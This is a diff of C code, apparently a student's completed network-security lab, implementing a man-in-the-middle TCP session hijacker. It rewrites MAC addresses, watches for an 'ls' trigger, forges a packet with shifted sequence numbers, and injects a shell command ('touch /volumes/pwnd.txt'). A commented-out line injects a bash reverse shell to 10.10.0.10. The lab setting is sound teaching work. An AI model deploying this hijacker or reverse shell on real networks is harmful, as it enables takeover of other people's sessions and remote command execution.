@@ -9,6 +9,7 @@
 #include <pcap/pcap.h>
 #include <stdlib.h>
 #include <string.h>
+#include <unistd.h>
 
 #include "log.h"
 #include "tcp_util.h"
@@ -18,8 +19,10 @@
 #define HOST_A_MAC "0a:1a:5d:92:0a:20"
 #define HOST_B_MAC "7e:8f:c5:5e:f3:09"
 
+char prevLetter = '\0';
+
 static int
-is_triggered(struct iphdr *phdr, struct tcphdr *tcphdr)
+is_triggered(struct iphdr *iphdr, struct tcphdr *tcphdr)
 {
   // TODO
   // =====
@@ -27,11 +30,23 @@ is_triggered(struct iphdr *phdr, struct tcphdr *tcphdr)
   //
   //   _Hint_: You might need to track information across packets here. You can
   //           use global variables or static variables.
+  if (tcphdr->ack && tcphdr->psh) {
+    uint16_t tcp_hdr_len = tcphdr->doff * 4;
+    char *data = (char *) tcphdr + tcp_hdr_len;
+    //printf("prev letter is: %c\n", prevLetter);
+    if (*data == 's' && prevLetter == 'l') {
+      prevLetter = *data;
+      return 1;
+    } else {
+      prevLetter = *data;
+      return 0;
+    }
+  }
   return 0;
 }
 
 static u_char *
-hijack_tcp_connect(const u_char *pkt, struct iphdr *iphdr, struct tcphdr *tchdr,
+hijack_tcp_connect(const u_char *pkt, struct iphdr *ip, struct tcphdr *tcp,
                    const char *cmd, size_t *len)
 {
   print_log("Running the TCP session hijacking code...\n");
@@ -40,29 +55,52 @@ hijack_tcp_connect(const u_char *pkt, struct iphdr *iphdr, struct tcphdr *tchdr,
   //  Add your implementation for the TCP session hijacking here...
   //
   //  1. Compute the length of your modified packet
-  //
+  size_t new_len = *len + strlen(cmd) -1;
+  
   //  2. Allocate space for that packet using malloc
-  //
+  u_char *new_pkt = (u_char *)malloc(new_len);
+
   //  3. Copy over the pkt into your return packet
   //     WARNING:
   //     return packet is longer than packet, you need to grab the
   //     original packet length to know how much to copy. OR copy the headers
   //     one by one.
-  //
+  memcpy(new_pkt, pkt, *len);
+  
   //  4. Grab new reference to the ip and tcp headers.
-  //
+  struct ether_header *eth = (struct ether_header *)new_pkt;
+  struct iphdr *new_ip = (struct iphdr *)(new_pkt + sizeof *eth);
+  struct tcphdr *new_tcp = (struct tcphdr *)(new_pkt + sizeof *eth + sizeof *new_ip);
+
+  new_ip = (struct iphdr *)(new_pkt + sizeof *eth);
+  new_tcp = (struct tcphdr *)(new_pkt + sizeof *eth + sizeof *new_ip);
+
   //  5. Set the new sequence number (we want this to be in the future).
-  //
+  size_t payload_len = 1;
+  new_tcp->seq = htonl(ntohl(tcp->seq) + payload_len);
+  new_tcp->ack_seq = htonl(ntohl(tcp->ack_seq) + payload_len);
+  //new_tcp->seq = tcp->seq;
+  //new_tcp->ack_seq = tcp->ack_seq;
+
   //  6. Write the data into your packet. What should the command start and end
   //     with?
-  //
+  uint16_t tcp_hdr_len = new_tcp->doff * 4;
+  char *data = (char *) new_tcp + tcp_hdr_len;
+  memcpy(data, cmd, strlen(cmd));
+
   //  7. Update the packet's total length tot_len field given your changes.
-  //
+  size_t increased = strlen(cmd) - 1;
+  new_ip->tot_len = htons(ntohs(ip->tot_len) + increased);
+
   //  8. Compute checksums over ip and tcp headers.
-  //
+  new_ip->check = 0;
+  new_ip->check = chksum((uint16_t *)new_ip, new_ip->ihl * 4);
+  new_tcp->check = 0;
+  new_tcp->check = compute_tcp_checksum(new_tcp, new_ip);
+
   //  9. Set *len to the new packet length and return the new packet.
-  *len = 0;
-  return 0;
+  *len = new_len;
+  return new_pkt;
 }
 
 void
@@ -100,35 +138,49 @@ parse_tcp(const u_char *pkt, const char *my_mac_addr, pcap_t *handle,
 
   // 1. You will need to fix the Ethernet header's source and destination MAC
   //    addresses, depending on where it's coming from.
-  //
-  //    _Hint_: Recall that you are posing as both hostA and hostB.
-  //
-  //    COPY THIS CODE OVER FROM LAB 07
-  //
   if(ip->saddr == host_a_addr.s_addr) {
     // packet coming from host a to host b, how should it reach b?
+    eth_addr = ether_aton(my_mac_addr);
+    memcpy(eth->ether_shost, eth_addr->ether_addr_octet, sizeof eth->ether_shost);
+    eth_addr = ether_aton(HOST_B_MAC);
+    memcpy(eth->ether_dhost, eth_addr->ether_addr_octet, sizeof eth->ether_dhost);
+
   } else if(ip->saddr == host_b_addr.s_addr) {
     // packet coming from host b to host a, how should it reach a?
+    eth_addr = ether_aton(my_mac_addr);
+    memcpy(eth->ether_shost, eth_addr->ether_addr_octet, sizeof eth->ether_shost);
+    eth_addr = ether_aton(HOST_A_MAC);
+    memcpy(eth->ether_dhost, eth_addr->ether_addr_octet, sizeof eth->ether_dhost);
   }
 
+  
   // 2. Check if the packet contains the trigger.
   //    NOTE: is_triggered might need to work across packets.
   if(is_triggered(ip, tcp)) {
     nlen = len;
-    npkt = hijack_tcp_connect(pkt, ip, tcp, "Command for your choice", &nlen);
-    int nrc = pcap_inject(handle, npkt, nlen);
-    free(npkt);
-    if(nrc == PCAP_ERROR_NOT_ACTIVATED) {
-      print_err("Pcap was not actived!\n");
-      exit(EXIT_FAILURE);
-    } else if(nrc == PCAP_ERROR) {
-      print_err("Pcap error: %s\n", pcap_geterr(handle));
+    npkt = hijack_tcp_connect(pkt, ip, tcp, "\rtouch /volumes/pwnd.txt\r", &nlen);
+    //npkt = hijack_tcp_connect(pkt, ip, tcp, "\n/bin/bash -i &> /dev/tcp/10.10.0.10 0<&1\n", &nlen);
+    if (nlen > 0) {
+      //sleep(1);
+      int nrc = pcap_inject(handle, npkt, nlen);
+      free(npkt);
+      if(nrc == PCAP_ERROR_NOT_ACTIVATED) {
+        print_err("Pcap was not actived!\n");
+        exit(EXIT_FAILURE);
+      } else if(nrc == PCAP_ERROR) {
+        print_err("Pcap error: %s\n", pcap_geterr(handle));
+        exit(EXIT_FAILURE);
+      }
+    } else {
+      print_err("nlen is zero/negative.\n");
       exit(EXIT_FAILURE);
     }
   }
 
   // 3. Compute checksum for both the TCP header and the IP header.
   //    COPY THIS OVER FROM LAB 07
+  tcp->check = 0;
+  tcp->check = compute_tcp_checksum(tcp, ip);
 
   // 4. Send the packet, this is the same code from previous labs.
   int rc = pcap_inject(handle, pkt, len);
@@ -139,6 +191,7 @@ parse_tcp(const u_char *pkt, const char *my_mac_addr, pcap_t *handle,
     print_err("Pcap error: %s\n", pcap_geterr(handle));
     exit(EXIT_FAILURE);
   }
+
 }
 
 uint16_t
